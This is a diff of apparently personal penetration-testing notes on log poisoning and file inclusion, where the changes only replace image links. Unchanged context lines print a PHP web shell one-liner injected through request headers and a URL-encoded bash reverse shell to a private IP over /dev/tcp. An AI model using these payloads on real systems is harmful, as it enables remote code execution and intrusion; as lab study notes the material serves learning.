@@ -11,7 +11,7 @@ Once found, we inject our code into User-Agent, URL, Headers, etc.
 ```
 <?php echo system($_GET['cmd']); ?>
 ```
-![[Pasted image 20260414201447.png|501]]
+![burp-request](../Images/burp-request.png)
 
 Now update the page parameter with the relative path 
 ```
@@ -22,7 +22,7 @@ Now we can try a reverse shell (URL encoded bash shell)
 ```
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.194%2F4444%200%3E%261%22
 ```
-![[Pasted image 20260414201629.png|463]]
+![burp shell](../Images/burp-shell.png)
 
 Data:// Wrapper
 When we cannot poison files we can use this wrapper to embed plaintext or base64 encoded data.
